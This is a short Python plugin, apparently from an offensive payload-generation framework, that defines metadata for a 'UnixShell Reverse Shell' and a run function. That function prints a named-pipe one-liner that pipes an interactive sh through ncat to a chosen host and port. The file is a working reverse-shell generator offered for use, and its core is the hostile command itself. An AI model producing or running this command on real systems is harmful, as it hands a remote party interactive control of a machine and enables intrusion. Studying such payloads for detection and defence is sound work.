#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# Metadata for a Unix-based reverse shell tool
metadata = {
    "name": "UnixShell Reverse Shell",
    "description": "A Unix-based reverse shell that uses named pipes and netcat to execute commands remotely.",
    "authors": ["DrDataYE"],
    "date": "2023-04-01",
    "license": "Custom Intellectual License",
    "references": [
        {"type": "url", "ref": "https://github.com/t3l3machus/hoaxshell"},
        {"type": "url", "ref": "https://revshells.com"},
    ],
    "options": {
        "lhost": {
            "type": "address",
            "description": "Target host address for the reverse shell connection",
            "required": True,
            "default": "0.0.0.0",
        },
        "lport": {
            "type": "int",
            "description": "Listening port on the target host for incoming connections",
            "required": False,
            "default": 6501,
        },
        "encode": {
            "type": "string",
            "description": "Encoding method for transmitted commands",
            "required": False,
            "default": "utf-8",
        },
    },
}


class Encoder:
    pass


def run(args):
    """Execute the Unix reverse shell command based on provided arguments"""
    lhost = args.get("lhost", metadata["options"]["lhost"]["default"])
    lport = args.get("lport", metadata["options"]["lport"]["default"])
    encode = args.get("encode", metadata["options"]["encode"]["default"])

    # Generate the Unix reverse shell command using netcat and FIFO pipes
    shell_command = (
        f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {lhost} {lport} >/tmp/f"
    )
    print(shell_command)
